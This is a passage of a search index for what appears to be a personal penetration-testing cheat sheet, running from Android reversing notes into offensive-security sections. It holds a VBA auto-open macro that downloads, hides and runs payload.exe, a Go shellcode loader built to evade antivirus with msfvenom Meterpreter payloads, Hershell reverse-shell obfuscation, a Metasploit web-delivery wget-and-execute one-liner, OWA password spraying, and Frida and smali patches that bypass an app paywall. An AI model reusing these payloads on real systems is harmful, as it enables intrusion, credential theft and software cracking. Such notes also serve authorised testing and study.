/system/etc/security/cacerts/\nchmod 644 /system/etc/security/cacerts/9a5ba575.0\n</code></pre> <p>Source: https://0x00sec.org/t/reversing-hackex-an-android-game/16243</p> <p>Warning</p> <p>I ran into the error <code>mount: '/system' not in /proc/mounts</code> (Nexus 6 API 28) and I fixed it by mounting the root (/) instead. Source: adb remount fails - mount: 'system' not in /proc/mounts. You migth have to start the emulator with -writable-system.</p>"},{"location":"mobile/adb/#enable-debugging","title":"Enable debugging","text":"<p>You\u2019ll need to edit the <code>AndroidManifest.xml</code> generated file, adding the<code>android:debuggable=\"true\"</code> attribute to its <code>application</code> XML node:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.company.appname\" \n                                                                     platformBuildVersionCode=\"24\" \n                                                                     platformBuildVersionName=\"7.0\"&gt;\n    &lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/&gt;\n    &lt;uses-permission android:name=\"android.permission.INTERNET\"/&gt;\n\n    &lt;application android:allowBackup=\"true\" android:icon=\"@mipmap/ic_launcher\" \n        android:label=\"@string/app_name\" \n        android:supportsRtl=\"true\" \n        android:theme=\"@style/AppTheme\"\n        android:debuggable=\"true\"&gt; &lt;-- !!! NOTICE ME !!! --&gt;\n\n        &lt;activity android:name=\"com.company.appname.MainActivity\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\"/&gt;\n                &lt;category android:name=\"android.intent.category.LAUNCHER\"/&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n    &lt;/application&gt;\n\n&lt;/manifest&gt;\n</code></pre>"},{"location":"mobile/adb/#screen-recording","title":"Screen recording","text":"<pre><code>adb shell screenrecord /sdcard/video.mp4\nadb pull /sdcard/video.mp4\nadb shell rm /sdcard/video.mp4\n</code></pre>"},{"location":"mobile/adb/#screenshot","title":"Screenshot","text":"<pre><code>adb exec-out screencap -p &gt; screenshot.png\n</code></pre>"},{"location":"mobile/adb/#install-xapk","title":"Install xapk","text":"<p>Unzip then:</p> <pre><code>adb install-multiple *.apk\n</code></pre>"},{"location":"mobile/apktool/","title":"Apktool","text":""},{"location":"mobile/apktool/#install","title":"Install","text":"<pre><code>brew install apktool\n</code></pre>"},{"location":"mobile/apktool/#update","title":"Update","text":"<pre><code>brew upgrade apktool\n</code></pre>"},{"location":"mobile/apktool/#decode","title":"Decode","text":"<pre><code>apktool decode base.apk\n</code></pre>"},{"location":"mobile/apktool/#build","title":"Build","text":"<pre><code>apktool build base -o base.apk\nkeytool -genkey -v -keystore my-release-key.keystore -alias alias_name \\\n                   -keyalg RSA -keysize 2048 -validity 10000\njarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore base.apk alias_name\njarsigner -verify -verbose -certs base.apk\nzipalign -v 4 base.apk base-aligned.apk\n</code></pre>"},{"location":"mobile/bundletool/","title":"Bundletool","text":"<pre><code>brew install bundletool\nbundletool build-apks \\\n--bundle=app.aab \\\n--output=app.apks \\\n--connected-device\nbundletool install-apks --apks=app.apks\n</code></pre> <p>{% hint style=\"warning\" %} You will need to have a debug keystore available !</p>"},{"location":"mobile/bundletool/#generating-a-debug-keystore","title":"Generating a debug keystore","text":"<pre><code>keytool \\\n-genkey \\\n-v \\\n-keystore debug.keystore \\\n-storepass android \\\n-alias androiddebugkey \\\n-keypass android \\\n-keyalg RSA \\\n-keysize 2048 \\\n-validity 10000\n</code></pre> <p>Source: https://coderwall.com/p/r09hoq/android-generate-release-debug-keystores</p>"},{"location":"mobile/correlium/","title":"Correlium","text":"<p>Warning</p> <p>To connect to the VPN, you will need to have a VPN client installed. If you don't already have a VPN client, we recommend Viscosity. The VPN software must support TAP mode.</p> <p>Source: https://www.corellium.com/blog/burp-getting-started</p>"},{"location":"mobile/correlium/#frida","title":"Frida","text":"<p>Make sure the same version is used locally and on Corellium.</p>"},{"location":"mobile/emulator/","title":"Emulator","text":"<pre><code>cd ${ANDROID_HOME}/emulator\n./emulator -list-avds\n./emulator -avd $(./emulator -list-avds) -writable-system\n</code></pre>"},{"location":"mobile/emulator/#modifying-system-files","title":"Modifying system files","text":"<pre><code>cd ${ANDROID_HOME}/tools\nadb root\nadb remount\nadb pull /system/etc/hosts ~/Downloads/hosts\necho '192.168.0.17 www.test.com' &gt;&gt; ~/Downloads/hosts\nadb push ~/Downloads/hosts /system/etc/hosts\nadb reboot\n</code></pre> <p>Warning</p> <p>The host file might be in a different location</p> <p>Source: https://medium.com/code-procedure-and-rants/use-modified-hosts-file-on-android-emulator-4f29f5d12ac1</p>"},{"location":"mobile/frida/","title":"Frida","text":""},{"location":"mobile/frida/#intro","title":"Intro","text":"<p>Frida is a dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers.</p>"},{"location":"mobile/frida/#update-frida-tools-cli","title":"Update Frida Tools (CLI)","text":"<pre><code>pip install -U frida-tools\n</code></pre>"},{"location":"mobile/frida/#add-frida-to-device","title":"Add Frida to device","text":"<p>Download from: https://github.com/frida/frida/releases</p> <pre><code>unxz frida-server-12.X.X-android-x86.xz\nadb push frida-server-12.X.X-android-x86 /data/local/tmp\n</code></pre> <p>Warning</p> <p>On a real device you will need to get the <code>android-arm</code> version</p>"},{"location":"mobile/frida/#starting-frida-server","title":"Starting Frida Server","text":"<pre><code>adb root\nadb shell\ncd /data/local/tmp\n./frida-server-12.X.X-android-x86 &amp;\n</code></pre>"},{"location":"mobile/frida/#disable-ssl-pinning","title":"Disable SSL pinning","text":"<pre><code>frida -U --codeshare sowdust/universal-android-ssl-pinning-bypass-2 --no-paus -f com.name.name\n</code></pre>"},{"location":"mobile/frida/#hooking-a-function","title":"Hooking a Function","text":"<pre><code>frida -U -l crack.js --no-paus -f com.package.package\n</code></pre> crack.js<pre><code>Java.perform(function() {\n    theClass = Java.use(\"com.package.package.paywall.PayWallStorageImpl\");\n    theClass.retrievePayWallIsOpen.implementation = function(v) {\n        return true;\n    }\n})\n</code></pre>"},{"location":"mobile/jadx/","title":"jadx","text":""},{"location":"mobile/jadx/#install","title":"Install","text":"<pre><code>brew install jadx\n</code></pre>"},{"location":"mobile/jadx/#update","title":"Update","text":"<pre><code>brew upgrade jadx\n</code></pre>"},{"location":"mobile/jadx/#decompile","title":"Decompile","text":"<pre><code>jadx app.apk\n</code></pre>"},{"location":"mobile/objection/","title":"Objection","text":""},{"location":"mobile/objection/#intro","title":"Intro","text":"<p>objection is a runtime mobile exploration toolkit, powered by Frida, built to help you assess the security posture of your mobile applications, without needing a jailbreak.</p>"},{"location":"mobile/objection/#update","title":"Update","text":"<pre><code>pip3 install -U objection\n</code></pre>"},{"location":"mobile/objection/#patching-an-apk","title":"Patching an APK","text":"<pre><code>objection patchapk --source app-release.apk\n</code></pre> <p>Warning</p> <p>You might need to use the flag <code>--skip-resources</code> if there is an error while rebuilding the APK.</p>"},{"location":"mobile/objection/#explore-apk","title":"Explore APK","text":"<p>First you will need to start the Frida server (either you patched the APK to run Frida when starting or you previously started the Frida's server).</p> <pre><code>objection -g com.package.package explore\n</code></pre>"},{"location":"mobile/objection/#disable-ssl-pinning","title":"Disable SSL Pinning","text":"<pre><code>android sslpinning disable\n</code></pre>"},{"location":"mobile/objection/#early-instrumentation","title":"Early Instrumentation","text":"<pre><code>objection explore --startup-command 'android sslpinning disable'\nobjection explore --startup-script ssl-pinning.js\n</code></pre>"},{"location":"mobile/objection/#list-activities","title":"List activities","text":"<pre><code>android hooking list activities com.package.package\n</code></pre>"},{"location":"mobile/objection/#list-classes","title":"List classes","text":"<pre><code>android hooking list classes\n</code></pre>"},{"location":"mobile/objection/#simple-hooks-for-each-class-method","title":"Simple hooks for each Class method","text":"<pre><code>android hooking generate simple &lt;class name&gt;\n</code></pre>"},{"location":"mobile/objection/#launch-activity","title":"Launch Activity","text":"<pre><code>android intent launch_activity com.package.package.class.NameActivity\n</code></pre>"},{"location":"mobile/objection/#hook-return_value","title":"Hook return_value","text":"<pre><code>android hooking set return_value com.package.package.paywall.PayWallStorageImpl.retrievePayWallIsOpen true\n</code></pre>"},{"location":"mobile/objection/#making-a-patch-permanent","title":"Making a patch permanent","text":"<pre><code>objection patchapk -s UnCrackable-Level1.apk -c gadget -l root.js\n</code></pre> gadgetroot.js <pre><code>{\n  \"interaction\": {\n    \"type\": \"script\",\n    \"path\": \"libfrida-gadget.script.so\"\n  }\n}\n</code></pre> <pre><code>Java.perform(function() {\n    var c = Java.use(\"sg.vantagepoint.a.c\");\n    c.a.implementation = function(v) { return false; }\n    c.b.implementation = function(v) { return false; }\n    c.c.implementation = function(v) { return false; }\n})\n</code></pre>"},{"location":"mobile/patching-smali/","title":"Patching Smali","text":"<p>Patching the method retrievePaywallIsOpen to always return true (<code>0x1</code>)</p>"},{"location":"mobile/patching-smali/#before","title":"Before","text":"<pre><code>.method public retrievePayWallIsOpen()Z\n    .locals 3\n\n    .line 12\n    iget-object v0, p0, Lcom/xxx/xxx/paywall/PayWallStorageImpl;-&gt;sharedPreferences:Landroid/content/SharedPreferences;\n\n    const-string v1, \"pay_wall_is_open\"\n\n    const/4 v2, 0x0\n\n    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;-&gt;getBoolean(Ljava/lang/String;Z)Z\n\n    move-result v0\n\n    return v0\n.end method\n</code></pre>"},{"location":"mobile/patching-smali/#after","title":"After","text":"<pre><code>.method public retrievePayWallIsOpen()Z\n    .locals 1\n\n    const/4 v0, 0x1\n\n    return v0\n.end method\n</code></pre>"},{"location":"mobile/xamarin/","title":"Xamarin","text":""},{"location":"mobile/xamarin/#reverse","title":"Reverse","text":"<p>Extract the DLLs then use ILSpy:</p>"},{"location":"mobile/xamarin/#step-1","title":"Step 1:","text":"<ul> <li>Mac) Install Visual Studio for Mac (http://visualstudio.microsoft.com/vs/mac/). It has MonoDevelop, all .NET tools, a full IDE, etc...</li> <li>Windows) Install Visual Studio or any other way to get the \"dotnet\" command line tool.</li> <li>Linux) Get the \"dotnet\" command line tool.</li> </ul>"},{"location":"mobile/xamarin/#step-2","title":"Step 2:","text":"<p>Go to a Terminal prompt and type <code>dotnet tool install ilspycmd -g</code> to install the official ilspy command line version.</p> <p>Global tools are installed in the following directories by default when you specify the <code>-g</code> or <code>--global</code> option:</p> OS Path Linux/macOS <code>$HOME/.dotnet/tools</code> Windows <code>%USERPROFILE%\\.dotnet\\tools</code>"},{"location":"mobile/xamarin/#step-3","title":"Step 3:","text":"<p>Read usage instructions here: https://github.com/icsharpcode/ILSpy/tree/master/ICSharpCode.Decompiler.Console. It is very simple. Most of the time you just run it with <code>ilspycmd -p -o &lt;folder&gt; &lt;dll file&gt;</code> to decompile to an output folder and make a buildable project file (that is what <code>-p</code> does).</p> <p>Source: https://github.com/aerror2/ILSpy-For-MacOSX/issues/6</p> <p>References:</p> <ul> <li>Decompressing Xamarin DLLs</li> </ul>"},{"location":"network/bettercap/","title":"Bettercap","text":""},{"location":"network/bettercap/#update","title":"Update","text":"<pre><code>go get -u github.com/bettercap/bettercap\ncd $GOPATH/src/github.com/bettercap/bettercap\nmake build\n</code></pre>"},{"location":"network/bettercap/#web-ui","title":"Web-UI","text":"<pre><code>sudo bettercap -caplet http-ui\n</code></pre>"},{"location":"offensive-security/macros/","title":"Macros","text":""},{"location":"offensive-security/macros/#tips","title":"Tips","text":"<ul> <li>Save Word document as \"Word 97-2004 Document .doc\" to not have to use the \"Word Macro-Enabled Document (.docm)</li> </ul>"},{"location":"offensive-security/macros/#simple-download-exec","title":"Simple Download / Exec","text":"<pre><code>Sub Auto_Open()\n\nConst ADTYPEBINARY = 1\nConst ADSAVECREATEOVERWRITE = 2\n\nDim xHttp\nDim bStrm\nDim filename\n\nSet xHttp = CreateObject(\"Microsoft.XMLHTTP\")\nxHttp.Open \"GET\", \"https://.../payload.exe\", False\nxHttp.Send\n\nSet gobjBinaryOutputStream = CreateObject(\"Adodb.Stream\")\n\nfilename = Environ(\"USERPROFILE\") &amp; \"\\\" &amp; DateDiff(\"s\", #1/1/1970#, Now())\n\ngobjBinaryOutputStream.Type = ADTYPEBINARY\ngobjBinaryOutputStream.Open\ngobjBinaryOutputStream.write xHttp.responseBody\ngobjBinaryOutputStream.savetofile filename, ADSAVECREATEOVERWRITE\n\nSetAttr filename, vbReadOnly + vbHidden + vbSystem\nShell (filename)\n\nEnd Sub\n</code></pre> <p>Inspired by https://gist.github.com/nopslider/0d48760928642ca190ed</p>"},{"location":"offensive-security/macros/#print-dummy-error-message-and-quit","title":"Print dummy error message and quit","text":"<pre><code>Dim title As String\ntitle = \"Microsoft Office (Compatibility Mode)\"\nDim msg As String\nDim intResponse As Integer\nmsg = \"This application appears to have been made with an older version of the Microsoft Office product suite. Please have the author save this document to a newer and supported format. [Error Code: -219]\"\nintResponse = MsgBox(msg, 16, title)\nApplication.Quit\n</code></pre> <p>Source: Unicorn</p>"},{"location":"offensive-security/unicorn/","title":"Unicorn","text":""},{"location":"offensive-security/unicorn/#examples","title":"Examples","text":"<p>Generating a macro that will download and execute a binary:</p> <pre><code>python2 unicorn.py windows/download_exec url=http://badurl.com/payload.exe macro\n</code></pre>"},{"location":"offensive-security/defense-evasion/","title":"Defense Evasion","text":""},{"location":"offensive-security/defense-evasion/load-shellcode-from-memory-using-golang/","title":"Load shellcode from memory using Golang","text":"<p>This is a program to run shellcode as its own process, all from memory written to defeat anti-virus detection.</p> <p>Original code by brimstone mofified by JUMPSEC:</p> main.goshellcode_unix.goshellcode_windows.go <pre><code>package main\n\nimport (\n    \"encoding/hex\"\n    \"fmt\"\n    \"os\"\n\n    shellcode \"github.com/brimstone/go-shellcode\"\n)\n\nfunc main() {\n\n    sc :=\"SHELLCODE-GOES-HERE\"\n    sc_bin, err := hex.DecodeString(sc)\n    if err != nil {\n        fmt.Printf(\"Error decoding arg 1: %s\\n\", err)\n        os.Exit(1)\n    }\n\n    shellcode.Run(sc_bin)\n}\n</code></pre> <pre><code>// +build linux freebsd darwin\n\npackage shellcode\n\n/*\n#include &lt;stdio.h&gt;\n#include &lt;sys/mman.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\nvoid call(char *shellcode, size_t length) {\n    if(fork()) {\n        return;\n    }\n    unsigned char *ptr;\n    ptr = (unsigned char *) mmap(0, length, \\\n        PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);\n    if(ptr == MAP_FAILED) {\n        perror(\"mmap\");\n        return;\n    }\n    memcpy(ptr, shellcode, length);\n    ( *(void(*) ()) ptr)();\n}\n*/\nimport \"C\"\nimport (\n    \"unsafe\"\n)\n\nfunc Run(sc []byte) {\n    C.call((*C.char)(unsafe.Pointer(&amp;sc[0])), (C.size_t)(len(sc)))\n}\n</code></pre> <pre><code>package shellcode\n\nimport (\n    \"syscall\"\n    \"unsafe\"\n)\n\nvar procVirtualProtect = syscall.NewLazyDLL(\"kernel32.dll\").NewProc(\"VirtualProtect\")\n\nfunc VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {\n    ret, _, _ := procVirtualProtect.Call(\n        uintptr(lpAddress),\n        uintptr(dwSize),\n        uintptr(flNewProtect),\n        uintptr(lpflOldProtect))\n    return ret &gt; 0\n}\n\nfunc Run(sc []byte) {\n    // TODO need a Go safe fork\n    // Make a function ptr\n    f := func() {}\n\n    // Change permissions on f function ptr\n    var oldfperms uint32\n    if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&amp;f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&amp;oldfperms)) {\n        panic(\"Call to VirtualProtect failed!\")\n    }\n\n    // Override function ptr\n    **(**uintptr)(unsafe.Pointer(&amp;f)) = *(*uintptr)(unsafe.Pointer(&amp;sc))\n\n    // Change permissions on shellcode string data\n    var oldshellcodeperms uint32\n    if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&amp;sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&amp;oldshellcodeperms)) {\n        panic(\"Call to VirtualProtect failed!\")\n    }\n\n    // Call the function ptr it\n    f()\n}\n</code></pre> <p>The binary can be built using this command:</p> <pre><code>GOOS=windows \\\nGOARCH=amd64 \\\ngo build -ldflags=\"-s -w -H=windowsgui\" \\\ncmd/sc/main.go\n</code></pre> <p>To generate the shellcode you can use this command:</p> <pre><code>msfvenom -p windows/x64/meterpreter/reverse_https \\\nLHOST=xxx \\\nLPORT=xxx \\\n-b \\x00 \\\n-f hex\n</code></pre> <p>Info</p> <p>At the time of writing the <code>windows/x64/meterpreter/reverse_tcp</code> payload was flagged by windows defender when executing (behavior analysis) but not the <code>windows/x64/meterpreter/reverse_https</code></p> <p>Starting the handler:</p> <pre><code>msfconsole -x \"use exploit/multi/handler;\\\nset PAYLOAD windows/x64/meterpreter/reverse_https;\\\nset LHOST localhost;\\\nset LPORT 8443;\\\nrun -j\"\n</code></pre> <p>Packing the binary using UPX might help with Antivirus detection:</p> <pre><code>brew install upx\nupx main.exe --brute\n</code></pre>"},{"location":"offensive-security/defense-evasion/load-shellcode-from-memory-using-golang/#references","title":"References","text":"<ul> <li>https://labs.jumpsec.com/2019/06/20/bypassing-antivirus-with-golang-gopher-it/</li> <li>https://github.com/brimstone/go-shellcode</li> </ul>"},{"location":"offensive-security/defense-evasion/obfuscating-hershell/","title":"Hershell","text":"<p>Hershell is a simple TCP reverse shell written in Go.</p>"},{"location":"offensive-security/defense-evasion/obfuscating-hershell/#installing-hershell","title":"Installing Hershell","text":"<pre><code>go get github.com/lesnuages/hershell\ncd $GOPATH/src/github.com/lesnuages/hershell/\nmake depends\nmake windows64 LHOST=192.168.0.12 LPORT=1234\n</code></pre>"},{"location":"offensive-security/defense-evasion/obfuscating-hershell/#obfuscating-hershell","title":"Obfuscating  Hershell","text":"<p>gobfuscate obfuscate Go binaries and packages.</p> <pre><code>go get github.com/unixpickle/gobfuscate\ngobfuscate -outdir github.com/lesnuages/hershell ./out\n</code></pre> <p>Warning</p> <p>You will have to set the <code>GOOS</code> and <code>GOARCH</code> before running gobfuscate since it's using the default build profile otherwise it will takes only the Linux source files.</p> <p>The Makefile also needs to be copied and edited:</p> <pre><code>LINUX_LDFLAGS=--ldflags \"-X main.kephknbjcmclaiojcnoa=${LHOST}:${LPORT} -X main.eghlidmkekfibfjihlkg=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)\"\nWIN_LDFLAGS=--ldflags \"-X main.kephknbjcmclaiojcnoa=${LHOST}:${LPORT} -X main.eghlidmkekfibfjihlkg=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2) -H=windowsgui\"\n</code></pre>"},{"location":"pentest/hashcat/","title":"Hashcat","text":"<p>Using rules</p> <pre><code>hashcat -a 0 -m 3200 hash.txt wordlist.txt -r rules/best64.rule -o cracked.txt\n</code></pre> <p>Info</p> <p>If installed using <code>brew</code> the path where the rules are is <code>/usr/local/Cellar/hashcat/6.1.1/share/doc/hashcat/rules/</code></p>"},{"location":"pentest/metasploit/","title":"Metasploit","text":"<pre><code>msfvenom -p linux/x86/meterpreter_reverse_https lhost=xx.xx.xx.xx lport=xxxx -f elf &gt; /tmp/reverse_https.elf\n</code></pre>"},{"location":"pentest/metasploit/#web-delivery","title":"Web Delivery","text":"<pre><code>msf6 exploit(multi/handler) &gt;\nmsf6 exploit(multi/handler) &gt; use exploit/multi/script/web_delivery\n[*] Using configured payload python/meterpreter/reverse_tcp\nmsf6 exploit(multi/script/web_delivery) &gt; set payload linux/x64/meterpreter/reverse_tcp\npayload =&gt; linux/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/script/web_delivery) &gt; set LHOST  10.10.14.48\nLHOST =&gt; 10.10.14.48\nmsf6 exploit(multi/script/web_delivery) &gt; set target 7\ntarget =&gt; 7\nmsf6 exploit(multi/script/web_delivery) &gt; run -J\n[*] Exploit completed, but no session was created.\nmsf6 exploit(multi/script/web_delivery) &gt;\n[*] Started reverse TCP handler on 10.10.14.48:4444\n[*] Using URL: http://0.0.0.0:8080/hPVOArQh\n[*] Local IP: http://192.168.0.22:8080/hPVOArQh\n[*] Server started.\n[*] Run the following command on the target machine:\nwget -qO K2RLRzHQ --no-check-certificate http://10.10.14.48:8080/hPVOArQh; chmod +x K2RLRzHQ; ./K2RLRzHQ&amp; disown\n[*] Sending stage (3012548 bytes) to 10.10.10.226\n\nmsf6 exploit(multi/script/web_delivery) &gt; [*] Meterpreter session 1 opened (10.10.14.48:4444 -&gt; 10.10.10.226:50338) at 2021-05-15 18:29:39 +0200\n</code></pre>"},{"location":"pentest/sqlmap/","title":"sqlmap","text":"<p>TODO :)</p> <pre><code>./sqlmap.py \\\n--force-ssl \\\n-r req  \\\n--second-req=req2 \\\n-p id \\\n--level 3 \\\n--risk 1 \\\n--union-cols=27 \\\n--prefix=\"'\" \\\n--suffix=\"-- a\" \\\n--test-filter=\"MySQL UNION query ([RANDNUM])\" \\\n--tamper=unionalltounion,hex2char \\\n--flush-session\n</code></pre>"},{"location":"pentest/sqlmap/#references","title":"References","text":"<ul> <li>Sqlmap Tricks for Advanced SQL Injection</li> <li>Exploiting difficult SQL injection vulnerabilities using sqlmap: Part 1</li> </ul>"},{"location":"pwn/pwntools/","title":"Pwntools","text":"<p>https://github.com/Gallopsled/pwntools#readme</p> <p>On mac M1 you need to build unicorn manually before install pwntools since GitHub CI does not support Mac M1:</p> <p><code>` git clone https://github.com/unicorn-engine/unicorn/ cd bindings/python python setup.py install python3 -m pip install --upgrade pwntools</code></p>"},{"location":"recon/aquatone/","title":"Aquatone","text":""},{"location":"recon/aquatone/#update","title":"Update","text":"<pre><code>go get -u github.com/michenriksen/aquatone\n</code></pre>"},{"location":"recon/bruteforcing-s3-buckets-using-ffuf/","title":"S3 buckets enumeration with ffuf","text":"<p>There are multiple ways to address the bucket:</p> <ul> <li>Virtual Hosted Style Access:</li> <li>https://s3.Region.amazonaws.com/bucket-name/key</li> <li>Path-Style Access:</li> <li>https://bucket-name.s3.Region.amazonaws.com/key</li> </ul> <pre><code>ffuf -X HEAD \\\n-u \"https://s3.us-east-1.amazonaws.com/DOMAIN\"  \\\n-w \"full.txt:DOMAIN\" \\\n-fc 400 -v\n</code></pre>"},{"location":"recon/censys/","title":"Censys","text":""},{"location":"recon/censys/#useful-filters","title":"Useful filters","text":"<pre><code>443.https.tls.certificate.parsed.subject.common_name:test.com\n</code></pre> <p>If the domain contains special characters and has a wildcard certificate:</p> <pre><code> 443.https.tls.certificate.parsed.subject.common_name:\\*.my\\-website.com\n</code></pre>"},{"location":"recon/massdns/","title":"MassDNS","text":"<pre><code>python3 ./scripts/subbrute.py bitquark-subdomains-top100000.txt example.com | \\\nmassdns -r resolvers.txt -t A -o S -w massdns-results.txt\n</code></pre>"},{"location":"recon/shodan/","title":"Shodan","text":""},{"location":"recon/shodan/#examples","title":"Examples","text":""},{"location":"recon/shodan/#non-https-ssl-services-that-were-issued-a-certificate-for-googlecom","title":"Non-HTTPS SSL services that were issued a certificate for *.google.com","text":"<pre><code>ssl.cert.subject.cn:google.com -HTTP\n</code></pre>"},{"location":"recon/shodan/#ssl-services-https-smtps-pop3s-etc-that-were-issued-a-certificate-for-googlecom","title":"SSL services (HTTPS, SMTPS, POP3S etc.) that were issued a certificate for *.google.com","text":"<pre><code>ssl.cert.subject.cn:google.com\n</code></pre> <p>Source: https://beta.shodan.io/search/examples</p>"},{"location":"red-team/initial-compromise/password-spraying/","title":"Password Spraying","text":""},{"location":"red-team/initial-compromise/password-spraying/#common-pattern","title":"Common pattern:","text":"<ul> <li>MonthYear (September2021)</li> <li>SeasonYear (Spring2021)</li> <li>DayDate (Wednesday1)</li> </ul>"},{"location":"red-team/initial-compromise/password-spraying/#cheatsheet","title":"Cheatsheet","text":"<p>Using <code>ipmo</code> to import the .ps1 script</p> <pre><code>PS C:\\&gt; ipmo C:\\Tools\\MailSniper\\MailSniper.ps1\n</code></pre> <p>Enumerate the NetBIOS name with <code>Invoke-DomainHarvestOWA</code></p> <pre><code>PS C:\\&gt; Invoke-DomainHarvestOWA -ExchHostname 10.10.15.100\n[*] Harvesting domain name from the server at 10.10.15.100\nThe domain appears to be: CYBER or cyberbotic.io\n</code></pre> <p>Generate potential usernames using namemash.py</p> <pre><code>root@kali:~# /opt/namemash.py names.txt &gt;&gt; possible-usernames.txt\nroot@kali:~# head -n 5 possible-usernames.txt\nbobfarmer\nfarmerbob\nbob.farmer\nfarmer.bob\nfarmerb\n</code></pre> <p>Enumerating usernames using <code>Invoke-UsernameHarvestOWA</code></p> <pre><code>PS C:\\&gt; Invoke-UsernameHarvestOWA -ExchHostname 10.10.15.100 -Domain CYBER -UserList .\\possible-usernames.txt -OutFile valid.txt\n[*] Now spraying the OWA portal at https://10.10.15.100/owa/\nDetermining baseline response time...\nResponse Time (MS)       Domain\\Username\n770                      CYBER\\nigojk\n766                      CYBER\\hnIYRl\n763                      CYBER\\DlQFbq\n767                      CYBER\\ghyWXj\n771                      CYBER\\uQbXAI\n\n         Baseline Response: 767.4\n\nThreshold: 460.44\nResponse Time (MS)       Domain\\Username\n764                      CYBER\\THdtMw\n776                      CYBER\\rVNvmq\n854                      CYBER\\AvaPOc\n767                      CYBER\\ZQpHFz\n764                      CYBER\\WYTZHK\n77                       CYBER\\iyates\n[*] Potentially Valid! User:CYBER\\iyatesgs\n[*] A total of 1 potentially valid usernames found.\nResults have been written to valid.txt.\n</code></pre> <p>Password spraying using <code>Invoke-PasswordSprayOWA</code></p> <pre><code>PS C:\\&gt; Invoke-PasswordSprayOWA -ExchHostname 10.10.15.100 -UserList .\\valid.txt -Password Summer2021\n[*] Now spraying the OWA portal at https://10.10.15.100/owa/\n[*] SUCCESS! User:CYBER\\iyates Password:Summer2021\n[*] A total of 1 credentials were obtained.\n</code></pre> <p>Retrieving the Global Address List (GAL) using <code>Get-GlobalAddressList</code></p> <pre><code>PS C:\\&gt; Get-GlobalAddressList -ExchHostname 10.10.15.100 -UserName CYBER\\iyates -Password Summer2021 -OutFile gal.txt\n[*] First trying to log directly into OWA to enumerate the Global Address List using FindPeople...\n[*] This method requires PowerShell Version 3.0\n[*] Using https://10.10.15.100/owa/auth.owa\n[*] Logging into OWA...\n[*] OWA Login appears to be successful.\n[*] Retrieving OWA Canary...\n[*] Successfully retrieved the X-OWA-CANARY cookie: ahhlRb0kZUKEg8YEo5ZZtQDYwqU8EdkIl7OJ7_ugwGfk56YCYe0ilgE2GKVxCNJTMpqknR3QJ_M.\n[*] Retrieving AddressListId from GetPeopleFilters URL.\n[*] Global Address List Id of b4477ba8-52b0-48bf-915e-d179db98788b was found.\n[*] Now utilizing FindPeople to retrieve Global Address List\n[*] Now cleaning up the list...\nbfarmer@cyberbotic.io\niyates@cyberbotic.io\njadams@cyberbotic.io\njking@cyberbotic.io\nnglover@cyberbotic.io\n[*] A total of 5 email addresses were retrieved\n[*] Email addresses have been written to gal.txt\n</code></pre>"},{"location":"red-team/initial-compromise/password-spraying/#tools","title":"Tools","text":"<ul> <li>MailSniper - Searching email in Microsoft Exchange, enumerating users and domains, gathering Global Address List (GAL) from OWA and EWS...</li> <li>namemash.py - Creating a user name list for brute force attacks.</li> <li>SprayingToolkit - Password spraying attacks against Lync/S4B, OWA &amp; O365</li> </ul>"},{"location":"web/burp/","title":"Burp","text":""},{"location":"web/burp/#start-burp-as-root","title":"Start Burp as root","text":"<pre><code>cd /Applications/Burp\\ Suite\\ Professional.app/Contents/java/app/\nsudo java -jar -Xmx2G burpsuite_pro.jar\n</code></pre> <p>Info</p> <p>Burp\u2019s license activation is tied to the current user context. So you will need to enter the license key again.</p>"},{"location":"web/iis/","title":"IIS","text":"<p>Microsoft IIS contains a flaw that may lead to an unauthorized information disclosure. The issue is triggered during the parsing of a request that contains a tilde character (\\~). This may allow a remote attacker to gain access to file and folder name information.</p> <pre><code>brew install jenv\necho 'export PATH=\"$HOME/.jenv/bin:$PATH\"' &gt;&gt; ~/.zshrc\necho 'eval \"$(jenv init -)\"' &gt;&gt; ~/.zshrc\nbrew tap homebrew/cask-versions\njenv add $(/usr/libexec/java_home)\njenv add /Library/Java/JavaVirtualMachines/zulu-7.jdk/Contents/Home/\njenv version\njenv doctor\n</code></pre> <pre><code>git clone https://github.com/irsdl/IIS-ShortName-Scanner\ncd IIS-ShortName-Scanner\njenv local 1.7\njava -jar iis_shortname_scanner.jar URL\n</code></pre> <p>References:</p> <ul> <li>https://github.com/irsdl/IIS-ShortName-Scanner</li> <li>https://www.youtube.com/watch?v=HrJW6Y9kHC4</li> </ul>"},{"location":"blog/archive/2022/","title":"2022","text":""},{"location":"blog/archive/2020/","title":"2020","text":""},{"location":"blog/category/writeup/","title":"WriteUp","text":""}]}